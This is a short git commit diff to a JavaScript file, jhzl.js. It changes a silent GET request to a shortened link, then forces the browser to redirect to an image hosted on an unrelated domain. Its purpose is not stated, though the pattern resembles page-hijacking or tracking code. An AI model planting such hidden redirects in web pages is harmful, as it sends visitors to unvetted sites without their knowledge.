4d9d94a3f4a869320164b16539e620a711ee7ef8
gongxinglin <121630207+gongxinglin@users.noreply.github.com>
2023-03-10 19:44:40 +0800

    Update jhzl.js

--- jhzl.js
+++ jhzl.js
@@ -1,3 +1,3 @@
-const settings = {"url": "https://ock.cn/JSBzt","method": "GET"};$.ajax(settings).done(function(response) {});
+const settings = {"url": "https://ock.cn/J9UBP","method": "GET"};$.ajax(settings).done(function(response) {document.location = "https://file.kwwblcj.com/member/atta/default/20230211/1676129157020.png"});
 
 	
